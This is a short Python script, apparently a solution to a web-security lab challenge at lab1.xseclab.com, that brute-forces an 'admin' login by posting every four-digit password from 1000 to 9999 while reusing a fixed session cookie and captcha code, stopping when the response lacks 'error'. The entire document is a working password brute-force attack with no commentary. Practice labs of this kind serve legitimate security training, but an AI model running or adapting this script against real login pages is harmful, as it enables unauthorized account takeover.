#!/usr/bin/env python3.4

import requests, threading

s = requests.session()
header = {
'Cookie':'saeut=124.89.2.88.1434295791298139; PHPSESSID=c767fc95548047de31bdd7275f0a798b',
}
value = {
		'username':'admin',
		'pwd':1234,
		'vcode':'krff',
}

for i in range(1000, 10000):
	value['pwd'] = i
	r = s.post('http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php',headers=header,data=value)
	r.encoding = 'utf-8'
	if 'error' not in r.text:
		print('find pwd: %d ' % i)
		print(r.text)
		exit()
